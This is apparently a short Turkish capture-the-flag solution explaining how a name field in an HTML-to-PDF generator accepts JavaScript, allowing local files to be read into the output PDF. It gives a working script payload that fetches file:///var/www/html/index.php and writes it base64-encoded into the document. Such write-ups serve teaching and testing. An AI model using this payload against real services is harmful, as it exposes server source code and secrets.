# Çözüm
PDF Dosyası ile yerel dosyalara erişilebiliyor. Pdf oluşturulmadan önce bir html dosya oluşuyor, bu dosya daha sonra pdf e dönüştürülüyor.

Girilen isim pdf dosyasının altında yer almakta, isminizi javascript kodlarından oluşturabiliyorsunuz. Yerel bir dosyayı mevcut dökümana yazan bir script iş görecektir.

```javascript
<script>x=new XMLHttpRequest;x.onload=function(){document.write(btoa(this.responseText))};x.open("GET","file:///var/www/html/index.php");x.send();</script>```
